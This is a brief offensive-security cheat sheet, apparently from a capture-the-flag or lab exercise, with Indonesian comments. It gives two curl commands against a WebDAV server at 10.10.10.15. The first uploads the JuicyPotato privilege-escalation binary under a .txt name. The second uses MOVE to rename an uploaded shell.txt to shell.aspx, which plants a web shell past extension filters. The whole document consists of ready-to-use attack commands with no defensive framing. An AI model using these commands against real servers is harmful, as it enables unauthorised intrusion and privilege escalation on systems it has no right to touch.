# webdav upload file binary

    curl -X PUT http://10.10.10.15/met.txt --data-binary @JuicyPotato.exe

# move buat rename

    curl -X MOVE --header 'Destination:http://10.10.10.15/shell.aspx' 'http://10.10.10.15/shell.txt'

